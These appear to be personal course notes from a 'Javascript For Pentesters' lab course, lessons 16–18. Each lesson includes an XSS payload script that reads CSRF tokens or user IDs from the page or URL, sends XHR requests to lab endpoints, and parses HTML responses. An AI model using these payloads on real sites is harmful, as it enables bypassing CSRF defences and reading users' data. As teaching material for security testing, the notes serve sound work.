                    Javascript For Pentesters
                    Course Notes Part 4


16 - Extracting CSRF Tokens
CSRF - Cross Site Request Forgery
A lot of sites require CSRF tokens to preven forgery attacks
Javascript can read CSRF tokens
In the sample app the CSRF token is part of the url but this is not true of all sites
CSRF placement can be dependent on both developer and framework
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML = req.responseText;
      }
    }
    
    // Gets the url and splits it using the ampersand as a delimiter
    var token = window.location.search.split('&')[1];
    req.open("GET", "lab url/email?name=username&"+token, true);
    req.send();
  </script>
If you are vulnerable to XSS then CSRF protections are useless

17 - Stealing CSRF Tokens
Find user email address & display it in a div name result
No hardcoding can be used everything must be done dynamically
There are also hints available in the source code of the sample web page
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML = req.responseText;
      }
    }  
    
    // Gets the elements and splits
    var uid = document.getElementById("uid").innerHTML.split(':')[1];
    var token = document.getElementById("csrf").innerHTML.split(':')[1];
    req.open("GET", "lab url/email?uid="+uid+"&csrf_token="+token, true);
    req.send();
  </script>


18 - HTML Parsing Of XHR Response
This type of attack has many different use cases
  - EG Mining data received from an XHR attack
The task to to parse HTML received as a respoonse during the attack which differs from previous examples that have used
string returns
Examining the source code gives the URL that will be used
HTML support using XHR is only available using asychronous
  - It is also only available if you set responseType to document
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      if(req.readyState == 4 && req.status == 200){
        var htmlPage = req.responseXML;
        var address = htmlPage.getElementById("address").innerHTML;
        alert(address);
        document.getElementById("result").innerHTML = address;
      }
    };
    
    req.open("GET", lab url, true);
    req.responseType = "document";
    req.send()
  </script>
There maybe different browser support for this, 

